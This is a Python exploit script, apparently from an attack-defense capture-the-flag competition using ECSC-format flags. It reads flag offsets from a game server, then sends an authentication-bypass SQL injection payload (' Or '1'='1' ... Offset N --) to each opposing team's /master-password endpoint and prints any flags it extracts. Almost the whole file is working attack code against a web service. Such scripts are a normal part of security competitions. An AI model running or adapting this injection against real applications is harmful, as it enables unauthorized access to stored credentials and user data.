#! /usr/bin/env python3

from pwn import *
import re
import sys
import time
import requests
import json

GAME_URL = "http://10.41.251.2/attack.json"
TEAM_IP = sys.argv[1]
TEAM_ID = TEAM_IP.split(".")[2] # 10.41.18.2 => 18

SERVICE = "Onbordo" # nombre del servicio. Obtenerlo de http://10.41.251.2/attack.json

def getFlagStorages():
    while True:
        try:
            r = requests.get(GAME_URL)
            resp_json = r.json()

            storages = resp_json["attack_info"][SERVICE][TEAM_IP]

        except:
            time.sleep(0.5)
            continue
        break

    return storages


storages = getFlagStorages()

offsets = []
if isinstance(storages, list):
    for storage in storages:
        if isinstance(storage, dict):
            for round_id, round_data in storage.items():
                if isinstance(round_data, dict):
                    for flag_id, offset in round_data.items():
                        if offset is not None:
                            try:
                                offsets.append(int(offset))
                            except ValueError:
                                continue
elif isinstance(storages, dict):
    for round_id, round_data in storages.items():
        if isinstance(round_data, dict):
            for flag_id, offset in round_data.items():
                if offset is not None:
                    try:
                        offsets.append(int(offset))
                    except ValueError:
                        continue

for offset in offsets:
    url = f"http://{TEAM_IP}:8080/master-password?email=%27+Or+%271%27%3D%271%27+ORDER+BY+id+DESC+Limit+1+Offset+{offset}+--&password="

    response = requests.get(url)

    pattern = r"ECSC\{[A-Za-z0-9_-]{32}\}"

    if re.search(pattern, response.text):
        match = re.search(pattern, response.text)
        print(match.group(), flush=True)
